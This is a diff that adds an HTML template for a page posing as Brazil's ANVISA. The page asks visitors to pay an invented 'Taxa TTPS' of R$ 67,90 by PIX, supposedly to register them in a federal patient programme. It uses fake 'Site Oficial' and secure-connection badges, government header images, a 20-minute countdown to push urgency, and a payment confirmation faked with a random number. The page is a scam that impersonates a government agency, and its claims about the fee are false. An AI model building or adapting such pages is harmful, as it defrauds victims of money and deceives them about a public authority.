@@ -1,0 +1,905 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pagamento da Taxa TTPS | ANVISA</title>
+  <link href="https://cdn.tailwindcss.com" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f8f9fa;
+    }
+    
+    .main-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1351b4;
+      margin-bottom: 8px;
+    }
+    
+    .subtitle {
+      font-size: 16px;
+      color: #666666;
+      margin-bottom: 24px;
+    }
+    
+    .sticky-header {
+      position: sticky;
+      top: 0;
+      background-color: white;
+      z-index: 50;
+      transition: box-shadow 0.3s ease;
+    }
+    
+    .sticky-header.shadow {
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    
+    .secure-badge {
+      display: inline-flex;
+      align-items: center;
+      background-color: #f0f7ff;
+      color: #1351b4;
+      padding: 6px 12px;
+      border-radius: 16px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    
+    .secure-badge i {
+      margin-right: 4px;
+    }
+    
+    .payment-container {
+      background-color: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+      overflow: hidden;
+      max-width: 700px;
+      margin: 0 auto;
+    }
+    
+    .payment-header {
+      background-color: #f0f7ff;
+      padding: 20px;
+      border-bottom: 1px solid #e0e7ff;
+    }
+    
+    .payment-content {
+      padding: 30px;
+    }
+    
+    .payment-box {
+      background-color: #f9fafb;
+      border-radius: 8px;
+      padding: 20px;
+      margin-bottom: 24px;
+      border: 1px solid #e5e7eb;
+    }
+    
+    .payment-title {
+      font-size: 18px;
+      font-weight: 600;
+      color: #1351b4;
+      margin-bottom: 16px;
+    }
+    
+    .payment-details {
+      margin-bottom: 16px;
+    }
+    
+    .payment-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 8px;
+      padding-bottom: 8px;
+      border-bottom: 1px dashed #e5e7eb;
+    }
+    
+    .payment-row:last-child {
+      border-bottom: none;
+      margin-bottom: 0;
+      padding-bottom: 0;
+    }
+    
+    .payment-label {
+      font-size: 14px;
+      color: #6b7280;
+    }
+    
+    .payment-value {
+      font-size: 14px;
+      font-weight: 500;
+      color: #4b5563;
+    }
+    
+    .payment-total {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 16px;
+      padding-top: 16px;
+      border-top: 1px solid #e5e7eb;
+    }
+    
+    .payment-total-label {
+      font-size: 16px;
+      font-weight: 600;
+      color: #1f2937;
+    }
+    
+    .payment-total-value {
+      font-size: 16px;
+      font-weight: 700;
+      color: #1351b4;
+    }
+    
+    .pix-container {
+      border: 1px solid #e5e7eb;
+      border-radius: 8px;
+      padding: 20px;
+      margin-bottom: 24px;
+      text-align: center;
+    }
+    
+    .pix-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #1351b4;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .pix-title img {
+      width: 24px;
+      height: 24px;
+      margin-right: 8px;
+    }
+    
+    .pix-qrcode {
+      margin: 20px auto;
+      max-width: 200px;
+    }
+    
+    .pix-code {
+      background-color: #f9fafb;
+      border: 1px dashed #d1d5db;
+      border-radius: 4px;
+      padding: 12px;
+      font-family: monospace;
+      font-size: 14px;
+      color: #4b5563;
+      word-break: break-all;
+      margin-bottom: 16px;
+    }
+    
+    .pix-instructions {
+      text-align: left;
+      margin-bottom: 16px;
+    }
+    
+    .pix-instruction {
+      display: flex;
+      align-items: flex-start;
+      margin-bottom: 12px;
+    }
+    
+    .pix-instruction-number {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background-color: #1351b4;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      font-weight: 600;
+      margin-right: 12px;
+      flex-shrink: 0;
+    }
+    
+    .pix-instruction-text {
+      font-size: 14px;
+      color: #4b5563;
+      flex-grow: 1;
+    }
+    
+    .btn {
+      padding: 12px 20px;
+      border-radius: 6px;
+      font-weight: 600;
+      font-size: 16px;
+      transition: all 0.2s ease;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      width: 100%;
+    }
+    
+    .btn-primary {
+      background-color: #1351b4;
+      color: white;
+      border: none;
+    }
+    
+    .btn-primary:hover {
+      background-color: #0c3d8a;
+    }
+    
+    .btn-secondary {
+      background-color: #f3f4f6;
+      color: #4b5563;
+      border: 1px solid #d1d5db;
+      margin-top: 12px;
+    }
+    
+    .btn-secondary:hover {
+      background-color: #e5e7eb;
+    }
+    
+    .btn i {
+      margin-right: 8px;
+    }
+    
+    .timer-container {
+      background-color: #eff6ff;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 24px;
+      border: 1px solid #bfdbfe;
+      text-align: center;
+    }
+    
+    .timer-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #1e40af;
+      margin-bottom: 8px;
+    }
+    
+    .timer-text {
+      font-size: 14px;
+      color: #4b5563;
+      margin-bottom: 12px;
+    }
+    
+    .timer-countdown {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1e40af;
+      font-family: monospace;
+    }
+    
+    .copy-button {
+      background-color: #1351b4;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      padding: 8px 12px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      transition: all 0.2s ease;
+    }
+    
+    .copy-button:hover {
+      background-color: #0c3d8a;
+    }
+    
+    .copy-button i {
+      margin-right: 6px;
+    }
+    
+    .vlibras-icon {
+      position: fixed;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      z-index: 1000;
+    }
+    
+    .payment-status {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    
+    .status-step {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      flex: 1;
+    }
+    
+    .status-step:not(:last-child)::after {
+      content: '';
+      position: absolute;
+      top: 12px;
+      right: calc(-50% + 12px);
+      width: calc(100% - 24px);
+      height: 2px;
+      background-color: #e5e7eb;
+      z-index: 0;
+    }
+    
+    .status-step.active:not(:last-child)::after {
+      background-color: #1351b4;
+    }
+    
+    .status-icon {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background-color: #e5e7eb;
+      color: #9ca3af;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      margin-bottom: 8px;
+      position: relative;
+      z-index: 1;
+    }
+    
+    .status-step.active .status-icon {
+      background-color: #1351b4;
+      color: white;
+    }
+    
+    .status-step.completed .status-icon {
+      background-color: #10b981;
+      color: white;
+    }
+    
+    .status-text {
+      font-size: 12px;
+      color: #6b7280;
+      text-align: center;
+    }
+    
+    .status-step.active .status-text {
+      color: #1351b4;
+      font-weight: 600;
+    }
+    
+    .status-step.completed .status-text {
+      color: #10b981;
+    }
+    
+    .loading-indicator {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+    
+    .loading-spinner {
+      width: 40px;
+      height: 40px;
+      border: 4px solid rgba(0, 0, 0, 0.1);
+      border-radius: 50%;
+      border-top: 4px solid #1351b4;
+      animation: spin 1s linear infinite;
+      margin-bottom: 16px;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .loading-text {
+      font-size: 16px;
+      font-weight: 500;
+      color: #1351b4;
+    }
+    
+    /* Status de pagamento (inicialmente oculto) */
+    .payment-success, .payment-pending, .payment-error {
+      display: none;
+      padding: 20px;
+      border-radius: 8px;
+      margin-bottom: 24px;
+      text-align: center;
+    }
+    
+    .payment-success {
+      background-color: #f0fdf4;
+      border: 1px solid #bbf7d0;
+    }
+    
+    .payment-pending {
+      background-color: #fffbeb;
+      border: 1px solid #fef3c7;
+    }
+    
+    .payment-error {
+      background-color: #fef2f2;
+      border: 1px solid #fecaca;
+    }
+    
+    .status-icon-large {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      margin: 0 auto 16px;
+    }
+    
+    .payment-success .status-icon-large {
+      background-color: #dcfce7;
+      color: #16a34a;
+    }
+    
+    .payment-pending .status-icon-large {
+      background-color: #fef3c7;
+      color: #d97706;
+    }
+    
+    .payment-error .status-icon-large {
+      background-color: #fee2e2;
+      color: #dc2626;
+    }
+    
+    .status-title {
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+    
+    .payment-success .status-title {
+      color: #16a34a;
+    }
+    
+    .payment-pending .status-title {
+      color: #d97706;
+    }
+    
+    .payment-error .status-title {
+      color: #dc2626;
+    }
+    
+    .status-message {
+      font-size: 14px;
+      color: #4b5563;
+      margin-bottom: 16px;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
+  <div class="sticky-header">
+    <div class="container mx-auto px-4 border-b border-[#0000001a]">
+      <div class="flex items-center justify-between py-2">
+        <div class="flex items-center">
+          <i class="fas fa-bars text-sm text-[#1451B4] mr-4 relative -top-1"></i>
+          <p class="text-[14px] text-[#333333] -ml-[5px] leading-tight">
+            Centro de Verificação Digital | ANVISA
+          </p>
+        </div>
+        <div class="flex items-center space-x-4">
+          <i class="fas fa-shield-alt text-sm text-green-600 relative -top-1"></i>
+          <i class="fas fa-lock text-sm text-green-600 relative -top-1"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="container mx-auto px-4">
+    <div class="py-4">
+      <div class="flex items-center space-x-2 text-[13px]">
+        <a class="text-[#1451B4]" href="#"><i class="fas fa-home text-sm text-[#1451B4]"></i></a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="#">Portal Cidadão</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="/ttps">Taxa TTPS</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <span class="font-bold">Pagamento</span>
+      </div>
+    </div>
+  </div>
+
+  <main class="max-w-3xl mx-auto px-4 py-6">
+    <div class="mb-6">
+      <h2 class="main-title">
+        Pagamento da Taxa TTPS
+      </h2>
+      <p class="subtitle">
+        Registro no Programa Federal de Pacientes Tarja Preta
+      </p>
+    </div>
+    
+    <div class="flex flex-wrap justify-center gap-3 my-4">
+      <span class="secure-badge"><i class="fas fa-shield-alt"></i> Site Oficial</span>
+      <span class="secure-badge"><i class="fas fa-lock"></i> Conexão Segura</span>
+      <span class="secure-badge"><i class="fas fa-credit-card"></i> Pagamento Protegido</span>
+    </div>
+    
+    <div class="payment-container">
+      <div class="payment-header">
+        <h3 class="text-lg font-semibold text-[#0c326f]">Taxa TTPS - R$ 67,90</h3>
+      </div>
+      
+      <div class="payment-content">
+        <div class="payment-status">
+          <div class="status-step completed">
+            <div class="status-icon">
+              <i class="fas fa-check"></i>
+            </div>
+            <div class="status-text">Geração</div>
+          </div>
+          
+          <div class="status-step active">
+            <div class="status-icon">
+              <i class="fas fa-credit-card"></i>
+            </div>
+            <div class="status-text">Pagamento</div>
+          </div>
+          
+          <div class="status-step">
+            <div class="status-icon">
+              <i class="fas fa-check-circle"></i>
+            </div>
+            <div class="status-text">Confirmação</div>
+          </div>
+          
+          <div class="status-step">
+            <div class="status-icon">
+              <i class="fas fa-clipboard-check"></i>
+            </div>
+            <div class="status-text">Registro</div>
+          </div>
+        </div>
+        
+        <div class="payment-box">
+          <h4 class="payment-title">Detalhes do Pagamento</h4>
+          
+          <div class="payment-details">
+            <div class="payment-row">
+              <div class="payment-label">Tipo de Taxa:</div>
+              <div class="payment-value">Taxa Tarja Preta Seguro (TTPS)</div>
+            </div>
+            
+            <div class="payment-row">
+              <div class="payment-label">Finalidade:</div>
+              <div class="payment-value">Registro no Programa Federal de Pacientes</div>
+            </div>
+            
+            <div class="payment-row">
+              <div class="payment-label">Validade:</div>
+              <div class="payment-value">12 meses a partir da data de pagamento</div>
+            </div>
+            
+            <div class="payment-row">
+              <div class="payment-label">Protocolo:</div>
+              <div class="payment-value" id="protocol">TTPS-2504-{{ random_id }}</div>
+            </div>
+          </div>
+          
+          <div class="payment-total">
+            <div class="payment-total-label">Valor Total:</div>
+            <div class="payment-total-value">R$ 67,90</div>
+          </div>
+        </div>
+        
+        <div class="timer-container">
+          <h4 class="timer-title">Tempo Restante para Pagamento</h4>
+          <p class="timer-text">Este código PIX expira em:</p>
+          <div class="timer-countdown" id="countdown">20:00</div>
+        </div>
+        
+        <div class="pix-container" id="pixPaymentSection">
+          <h4 class="pix-title">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/76/Pix_logo.svg" alt="Pix Logo">
+            Pagamento via PIX
+          </h4>
+          
+          <p class="text-sm text-gray-600 mb-4">
+            Escaneie o QR Code abaixo ou copie o código PIX para realizar o pagamento rapidamente.
+          </p>
+          
+          <img class="pix-qrcode" id="pixQrCode" src="{{ qr_code_url }}" alt="QR Code PIX">
+          
+          <div class="mt-4 mb-2">
+            <button class="copy-button" id="copyPixButton">
+              <i class="fas fa-copy"></i> Copiar Código PIX
+            </button>
+          </div>
+          
+          <div class="pix-code" id="pixCode">
+            {{ pix_code }}
+          </div>
+          
+          <div class="pix-instructions">
+            <div class="pix-instruction">
+              <div class="pix-instruction-number">1</div>
+              <div class="pix-instruction-text">
+                Abra o aplicativo do seu banco e acesse o PIX
+              </div>
+            </div>
+            
+            <div class="pix-instruction">
+              <div class="pix-instruction-number">2</div>
+              <div class="pix-instruction-text">
+                Escolha a opção de pagar com QR Code ou Copia e Cola
+              </div>
+            </div>
+            
+            <div class="pix-instruction">
+              <div class="pix-instruction-number">3</div>
+              <div class="pix-instruction-text">
+                Escaneie o QR Code ou cole o código copiado
+              </div>
+            </div>
+            
+            <div class="pix-instruction">
+              <div class="pix-instruction-number">4</div>
+              <div class="pix-instruction-text">
+                Confirme as informações e finalize o pagamento
+              </div>
+            </div>
+          </div>
+        </div>
+        
+        <div class="loading-indicator" id="loadingSection">
+          <div class="loading-spinner"></div>
+          <div class="loading-text">Verificando pagamento...</div>
+        </div>
+        
+        <!-- Status de Pagamento (inicialmente ocultos) -->
+        <div class="payment-success" id="successSection">
+          <div class="status-icon-large">
+            <i class="fas fa-check"></i>
+          </div>
+          <h3 class="status-title">Pagamento Confirmado!</h3>
+          <p class="status-message">
+            O pagamento da Taxa TTPS foi realizado com sucesso. Aguarde enquanto registramos você no programa federal.
+          </p>
+          <div class="mt-4">
+            <a href="/compra_sucesso" class="btn btn-primary">
+              <i class="fas fa-check-circle"></i> Continuar
+            </a>
+          </div>
+        </div>
+        
+        <div class="payment-pending" id="pendingSection">
+          <div class="status-icon-large">
+            <i class="fas fa-clock"></i>
+          </div>
+          <h3 class="status-title">Aguardando Confirmação</h3>
+          <p class="status-message">
+            Estamos processando seu pagamento. Isso pode levar alguns instantes.
+          </p>
+          <div class="mt-4">
+            <button id="checkAgainButton" class="btn btn-primary">
+              <i class="fas fa-sync-alt"></i> Verificar Novamente
+            </button>
+          </div>
+        </div>
+        
+        <div class="payment-error" id="errorSection">
+          <div class="status-icon-large">
+            <i class="fas fa-exclamation-triangle"></i>
+          </div>
+          <h3 class="status-title">Erro no Pagamento</h3>
+          <p class="status-message">
+            Não foi possível confirmar seu pagamento. Por favor, tente novamente ou utilize outro método.
+          </p>
+          <div class="mt-4">
+            <button id="tryAgainButton" class="btn btn-primary">
+              <i class="fas fa-redo"></i> Tentar Novamente
+            </button>
+          </div>
+        </div>
+        
+        <div class="mt-6">
+          <button id="checkPaymentButton" class="btn btn-primary">
+            <i class="fas fa-sync-alt"></i> Verifiquei o Pagamento
+          </button>
+          
+          <a href="/ttps" class="btn btn-secondary">
+            <i class="fas fa-arrow-left"></i> Voltar
+          </a>
+        </div>
+      </div>
+    </div>
+  </main>
+  
+  <div class="w-full mt-6">
+    <img src="https://i.ibb.co/DHjL5PHX/IMG-3117.jpg" alt="Imagem de rodapé do site" class="w-full">
+  </div>
+  
+  <a href="#" class="vlibras-icon">
+    <img src="https://cdn.jsdelivr.net/gh/spbgovbr-vlibras/vlibras-portal@dev/app/assets/access_icon.svg" alt="Ícone de acessibilidade em Libras" class="w-10 h-10">
+  </a>
+  
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      // Elementos
+      const countdownElement = document.getElementById('countdown');
+      const pixPaymentSection = document.getElementById('pixPaymentSection');
+      const loadingSection = document.getElementById('loadingSection');
+      const successSection = document.getElementById('successSection');
+      const pendingSection = document.getElementById('pendingSection');
+      const errorSection = document.getElementById('errorSection');
+      const checkPaymentButton = document.getElementById('checkPaymentButton');
+      const checkAgainButton = document.getElementById('checkAgainButton');
+      const tryAgainButton = document.getElementById('tryAgainButton');
+      const copyPixButton = document.getElementById('copyPixButton');
+      const pixCodeElement = document.getElementById('pixCode');
+      const protocolElement = document.getElementById('protocol');
+      
+      // Gerar protocolo aleatório se necessário
+      if (protocolElement && protocolElement.textContent.includes('{{')) {
+        const date = new Date();
+        const day = date.getDate().toString().padStart(2, '0');
+        const month = (date.getMonth() + 1).toString().padStart(2, '0');
+        const randomID = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
+        protocolElement.textContent = `TTPS-${day}${month}-${randomID}`;
+      }
+      
+      // Função para copiar o código PIX
+      if (copyPixButton && pixCodeElement) {
+        copyPixButton.addEventListener('click', function() {
+          const pixCode = pixCodeElement.textContent.trim();
+          navigator.clipboard.writeText(pixCode).then(function() {
+            copyPixButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
+            setTimeout(function() {
+              copyPixButton.innerHTML = '<i class="fas fa-copy"></i> Copiar Código PIX';
+            }, 2000);
+          });
+        });
+      }
+      
+      // Configurar o timer de contagem regressiva
+      let timeRemaining = 20 * 60; // 20 minutos em segundos
+      
+      function updateCountdown() {
+        const minutes = Math.floor(timeRemaining / 60);
+        const seconds = timeRemaining % 60;
+        
+        countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        
+        if (timeRemaining <= 0) {
+          clearInterval(countdownInterval);
+          // Mostra mensagem de expiração
+          showErrorState('O tempo para pagamento expirou. Por favor, gere um novo código.');
+        }
+        
+        timeRemaining--;
+      }
+      
+      // Iniciar o timer
+      updateCountdown();
+      const countdownInterval = setInterval(updateCountdown, 1000);
+      
+      // Funções para gerenciar os estados de exibição
+      function showLoadingState() {
+        pixPaymentSection.style.display = 'none';
+        loadingSection.style.display = 'flex';
+        successSection.style.display = 'none';
+        pendingSection.style.display = 'none';
+        errorSection.style.display = 'none';
+        checkPaymentButton.style.display = 'none';
+      }
+      
+      function showSuccessState() {
+        pixPaymentSection.style.display = 'none';
+        loadingSection.style.display = 'none';
+        successSection.style.display = 'block';
+        pendingSection.style.display = 'none';
+        errorSection.style.display = 'none';
+        checkPaymentButton.style.display = 'none';
+        
+        // Atualizar o status dos passos
+        updateStatusSteps(3);
+      }
+      
+      function showPendingState() {
+        pixPaymentSection.style.display = 'none';
+        loadingSection.style.display = 'none';
+        successSection.style.display = 'none';
+        pendingSection.style.display = 'block';
+        errorSection.style.display = 'none';
+        checkPaymentButton.style.display = 'none';
+      }
+      
+      function showErrorState(message) {
+        pixPaymentSection.style.display = 'block';
+        loadingSection.style.display = 'none';
+        successSection.style.display = 'none';
+        pendingSection.style.display = 'none';
+        errorSection.style.display = 'block';
+        checkPaymentButton.style.display = 'inline-flex';
+        
+        if (message) {
+          const errorMessageElement = errorSection.querySelector('.status-message');
+          if (errorMessageElement) {
+            errorMessageElement.textContent = message;
+          }
+        }
+      }
+      
+      function resetPaymentView() {
+        pixPaymentSection.style.display = 'block';
+        loadingSection.style.display = 'none';
+        successSection.style.display = 'none';
+        pendingSection.style.display = 'none';
+        errorSection.style.display = 'none';
+        checkPaymentButton.style.display = 'inline-flex';
+      }
+      
+      // Função para atualizar os passos do status
+      function updateStatusSteps(completedStep) {
+        const statusSteps = document.querySelectorAll('.status-step');
+        
+        statusSteps.forEach((step, index) => {
+          step.classList.remove('active', 'completed');
+          
+          if (index < completedStep) {
+            step.classList.add('completed');
+          } else if (index === completedStep) {
+            step.classList.add('active');
+          }
+        });
+      }
+      
+      // Simular verificação de pagamento (no ambiente real, isso seria uma chamada AJAX)
+      function checkPaymentStatus() {
+        showLoadingState();
+        
+        // Simulação: 2 segundos para processar
+        setTimeout(function() {
+          // Simulação: 50% de chance de sucesso (em produção, isso seria uma verificação real)
+          if (Math.random() < 0.5) {
+            showSuccessState();
+            
+            // Após 2 segundos, redirecionar para a página de sucesso
+            setTimeout(function() {
+              window.location.href = '/ttps_sucesso';
+            }, 2000);
+          } else {
+            showPendingState();
+          }
+        }, 2000);
+      }
+      
+      // Event listeners para os botões
+      if (checkPaymentButton) {
+        checkPaymentButton.addEventListener('click', checkPaymentStatus);
+      }
+      
+      if (checkAgainButton) {
+        checkAgainButton.addEventListener('click', checkPaymentStatus);
+      }
+      
+      if (tryAgainButton) {
+        tryAgainButton.addEventListener('click', resetPaymentView);
+      }
+    });
+    
+    // Efeito de scroll na barra de navegação
+    window.addEventListener('scroll', function() {
+      const header = document.querySelector('.sticky-header');
+      if (window.pageYOffset > 0) {
+        header.classList.add('shadow');
+      } else {
+        header.classList.remove('shadow');
+      }
+    });
+  </script>
+</body>
+</html>
